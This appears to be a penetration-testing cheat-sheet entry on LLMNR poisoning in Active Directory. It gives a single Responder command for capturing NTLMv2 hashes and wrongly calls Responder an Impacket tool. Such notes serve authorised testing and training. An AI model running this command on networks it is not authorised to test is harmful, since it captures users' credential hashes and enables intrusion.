### Active Directory

#### LLMNR Poisoning
```
# Linked Local Multi-cast Name Resolution Poisoning using Impacket tool, Responder.
# Run this first thing, even before as it will capture generated traffic.

# Capture NTLMv2 Hash with Responder. Start listening for events
responder -I eth0 -rdw
```
